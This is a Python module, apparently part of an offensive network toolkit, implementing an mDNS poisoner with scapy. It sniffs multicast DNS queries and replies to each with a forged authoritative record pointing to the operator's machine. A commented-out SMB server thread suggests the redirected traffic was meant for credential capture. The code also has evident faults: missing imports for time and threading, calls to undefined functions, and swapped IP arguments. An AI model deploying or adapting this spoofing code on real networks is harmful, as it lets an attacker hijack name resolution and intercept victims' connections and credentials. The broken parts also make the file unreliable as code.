#!/usr/bin/env python
# -*- coding: utf-8 -*-


from scapy.all import DNSRR, DNS, Ether, IP, UDP, sendp, sniff, packet, IPv6
from .poisoninfo import PoisonNetworkInfo


class MDNS(PoisonNetworkInfo):
    def __init__(self, ip: str, ipv6: str, mac_address: str, iface: str):
        super().__init__(ip, ipv6, mac_address, iface)
        self._targets_used = []
        self._mdns_poisoner_process = None

    @property
    def targets_used(self):
        return self._targets_used

    @property
    def mdns_poisoner_process(self):
        return self._mdns_poisoner_process

    @mdns_poisoner_process.setter
    def mdns_poisoner_process(self, process):
        self._mdns_poisoner_process = process

    def dns_record(self, pkt: packet) -> DNSRR:
        return DNSRR(
            rrname=pkt[DNS].qd.qname,
            type="A",
            rclass="IN",
            ttl=120,
            rdlen=None,
            rdata=self.ip,
        )

    def data_link_layer(self, pkt: packet) -> None:
        return Ether(dst=pkt[Ether].src, src=self.mac_address)

    def network_layer(self, pkt, response):
        ip_of_the_packet = None
        if IP in pkt:
            if pkt[IP].src == self.ip:
                return
            response /= IP(dst=pkt[IP].src)
            ip_of_the_packet = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == self.ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ip_of_the_packet = pkt[IPv6].src
        return response, ip_of_the_packet

    def transport_layer(self, response: packet) -> packet:
        response /= UDP(sport="mdns", dport="mdns")
        return response

    def application_layer(self, pkt: packet, response: packet) -> packet:
        response /= DNS(
            id=pkt[DNS].id,
            qr=1,
            opcode="QUERY",
            aa=1,
            rd=0,
            rcode="ok",
            qdcount=0,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=None,
            an=self.dns_record(pkt),
            ns=None,
            ar=None,
        )
        return response

    def send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        # if ip_of_the_packet not in self.targets_used:
        print("Sending packet to " + ip_of_the_packet)
        sendp(response, verbose=False)
        self.targets_used.append(ip_of_the_packet)

    def filter_for_mdns(self, pkt: packet) -> bool:
        return (
            pkt.haslayer(DNS)
            and (pkt.haslayer(IP) or pkt.haslayer(IPv6))
            and pkt[DNS].qd is not None
        )

    def mdns_checking_packets(self, pkt: packet) -> None:
        if self.filter_for_mdns(pkt):
            response = self.data_link_layer(pkt)
            response, ip_of_the_packet = self.network_layer(pkt, response)
            response = self.transport_layer(response)
            response = self.application_layer(pkt, response)
            self.send_packet(response, ip_of_the_packet)

    def start_mdns_poisoning(self) -> None:
        # Port of mdns 5353
        # filter="udp and port mdns",
        sniff(
            filter="udp and port mdns",
            iface=self.iface,
            prn=self.mdns_checking_packets,
            store=0,
        )

    def cleaner(self):
        print("Empezando sleeper...")
        while True:
            time.sleep(3)
            self.targets_used.clear()


def startPoison():
    try:
        ipv6 = "fe80::20c:29ff:fe89:df69"
        ip = "192.168.253.135"
        ether = "00:0c:29:89:df:69"
        iface = "ens33"

        MDNSPoison = threading.Thread(target=mdnsPoison, args=(ipv6, ip, ether, iface))
        MDNSPoison.daemon = True
        MDNSPoison.start()
        # server = threading.Thread(target=startSMBServer)
        # server.daemon = True
        # server.start()
        sleeper = threading.Thread(target=cleaner)
        sleeper.daemon = True
        sleeper.start()
        # server.join()
        MDNSPoison.join()
        sleeper.join()
    except KeyboardInterrupt:
        print("Saliendo ...")
